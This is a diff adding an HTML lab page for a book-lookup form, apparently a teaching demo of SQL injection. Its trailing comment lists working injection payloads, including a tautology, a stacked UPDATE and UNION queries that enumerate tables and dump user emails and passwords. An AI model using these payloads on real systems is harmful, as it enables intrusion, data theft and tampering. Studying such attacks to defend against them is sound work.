@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>SQL Injection</title>
+		<script type="text/javascript">
+
+		</script>
+		<style type="text/css">
+
+		</style>
+	</head>
+	<body>
+		<form method="GET" action="book.php">
+			<label>ISBN: <input type="text" name="isbn" /></label>
+			<br/><br/><input type="submit" value="Fetch Details">
+		</form>
+	</body>
+</html>
+
+<!--
+	Try these inputs
+
+		valid and in db
+		valid but not in db
+		single quotes
+			Query execution failed
+			You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'sdf'' at line 1
+
+			This tells us about MySQL (hence syntax and db specific attacks)
+			Single quotes
+		222' or 1=1#
+			# to comment out the trailing '
+		1'; update book_details set bname='milk' where isbn='1';#
+
+		invalidInput' union SELECT TABLE_NAME, NULL, NULL, NULL from information_schema.TABLES
+			Got the table name
+		invalidInput' union SELECT COLUMN_NAME, NULL, NULL, NULL from information_schema.COLUMNS where TABLE_NAME='USERS'#
+			Got the 5 columns
+		invalidInput' union SELECT ID, EMAIL, PASSWORD, STATUS from USERS#
+
+ -->
